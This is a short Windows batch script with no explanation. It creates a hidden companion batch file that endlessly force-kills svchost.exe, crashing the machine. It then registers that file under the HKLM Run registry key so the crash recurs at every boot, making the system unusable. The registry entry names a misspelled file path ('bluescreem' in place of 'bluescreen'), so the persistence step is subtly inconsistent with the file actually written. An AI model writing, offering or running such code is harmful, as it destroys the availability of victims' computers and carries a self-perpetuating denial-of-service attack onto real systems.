@echo off
echo @echo off >> %userprofile%\bluescreen_permacrashREG.bat
echo :loop >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo taskkill /im svchost.exe /f /t >> %userprofile%\bluescreen_permacrashREG.bat
echo goto loop >> %userprofile%\bluescreen_permacrashREG.bat

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V MisterChaos%random% /T REG_SZ /D "%userprofile%\bluescreem_permacrashREG.bat" /F